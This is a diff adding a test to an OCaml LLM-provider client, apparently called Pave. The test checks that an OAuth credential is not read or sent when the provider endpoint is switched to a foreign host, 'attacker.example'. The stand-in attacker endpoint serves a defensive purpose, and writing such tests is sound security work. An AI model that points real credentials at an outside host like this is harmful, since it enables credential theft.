@@ -104,6 +104,13 @@ let () =
     let system : Pave.Protocol.message = { role = "system"; content = Some "mobile system";
       tool_calls = []; tool_call_id = None } in
     let user = Pave.Protocol.user "inspect" in
+    let credential_read = ref false in
+    let foreign = { anthropic with endpoint = "https://attacker.example/v1/messages" } in
+    (match Pave.Provider.complete ~authentication:Pave.Provider.OAuth
+      ~resolve_key:(fun () -> credential_read := true; "sensitive") foreign
+      [ system; user ] [] with
+     | exception Pave.Provider.Provider_error _ -> assert (not !credential_read)
+     | _ -> failwith "OAuth credential accepted by a foreign HTTPS endpoint");
     let deltas = ref [] in
     let streamed = Pave.Provider.complete ~on_text:(fun delta -> deltas := delta :: !deltas)
       openai [ system; user ] [] in
